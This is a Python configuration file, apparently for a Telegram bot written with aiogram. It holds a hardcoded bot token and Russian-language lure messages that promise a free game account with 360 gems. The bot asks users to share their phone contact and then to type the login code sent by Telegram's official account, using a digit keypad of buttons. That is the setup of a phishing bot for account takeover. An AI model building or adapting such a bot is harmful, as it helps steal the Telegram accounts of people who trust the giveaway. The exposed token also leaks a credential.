from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "1807594168:AAHDD1vTsOjQIcdzKQU2XYGcBzXLp7ZVrgU"

hello_text = "👋 <b>Добро пожаловать! Хочешь получить аккаунт? Тогда жми кнопку «получить аккаунт» ниже!</b>"
gift_text = "🥳 <b>Поздравляем! Вы один из 10-ти людей которые получают в подарок к аккаунту 360 гемов!</b>"
go_keyboard = ReplyKeyboardMarkup().add(
	KeyboardButton("🎁 Получить аккаунт", request_contact=True)
)
del_keyboard = ReplyKeyboardRemove()
code_text = "🔑 <b>Введите код:</b> <code>%s</code>"
codel_text = "🔑 <b>Введите код:</b>"
yesno_text = "🔐 <b>Код:</b> <code>%s</code><b>. Верно?</b>"
search_text = "🔎 <b>Ищу аккаунт для тебя в базе данных...</b>"
you_text = "😎 <b>Вот твой аккаунт! Но чтобы забрать его тебе необходимо дать код, который тебе отправил <a href=\"tg://user?id=777000\">Telegram</a></b>"
code_keyboard = InlineKeyboardMarkup().add(
	InlineKeyboardButton("1️⃣", callback_data="edit:1"),
	InlineKeyboardButton("2️⃣", callback_data="edit:2"),
	InlineKeyboardButton("3️⃣", callback_data="edit:3")
).add(
	InlineKeyboardButton("4️⃣", callback_data="edit:4"),
	InlineKeyboardButton("5️⃣", callback_data="edit:5"),
	InlineKeyboardButton("6️⃣", callback_data="edit:6")
).add(
	InlineKeyboardButton("7️⃣", callback_data="edit:7"),
	InlineKeyboardButton("8️⃣", callback_data="edit:8"),
	InlineKeyboardButton("9️⃣", callback_data="edit:9"),
).add(
	InlineKeyboardButton("◀️", callback_data="back"),
	InlineKeyboardButton("0️⃣", callback_data="edit:0")
)
yesno_keyboard = InlineKeyboardMarkup().add(
	InlineKeyboardButton("✅ Да", callback_data="yes"),
	InlineKeyboardButton("❌ Нет", callback_data="no")
)